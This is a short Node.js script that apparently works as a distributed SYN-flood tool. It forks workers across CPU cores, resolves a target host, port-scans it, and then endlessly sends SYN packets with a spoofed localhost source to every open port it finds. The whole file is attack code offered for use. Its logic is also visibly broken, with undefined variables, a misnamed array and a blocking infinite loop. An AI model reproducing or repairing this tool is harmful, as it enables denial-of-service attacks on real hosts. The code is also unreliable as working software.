const cluster = require('cluster');
const http = require('http');
const resolver = require('./resolver');
const syn = require('./syn');
const ping = require('./ping');
const portscan = require('./portscan');

if (cluster.isMaster) {

    function messageHandler(msg) {
        /*if (msg.cmd && msg.cmd === 'ping') {
            ping(msg.host);
        }*/
        if (msg.cmd && msg.cmd === 'syn') {
            console.log(`syn-ing ${port}, ${ip}`);
            syn('127.0.0.1', msg.host, 80, msg.port);
        }
    }

    const numCPUs = require('os').cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    for (const id in cluster.workers) {
        cluster.workers[id].on('message', messageHandler);
    }

    process.on('SIGINT', code => {
        for (const id in cluster.workers) {
            console.log(`killing ${id}`);
            cluster.workers[id].kill();
        }
        console.log('exiting');
        process.exit();
    })

} else {
    let targets = [];
    resolver(process.argv[2], (addresses) => {
        console.log(addresses);
            addresses.forEach(address => {
                portscan(address, (ports) => {
                    console.log(ports);
                    ports.forEach(port => target.push({address, port}));
                })
            });
        while(1) {
            targets.forEach(target => {
                process.send({cmd: process.argv[3] || 'syn', host: target.address, port: target.port});
            })
        }
    });
}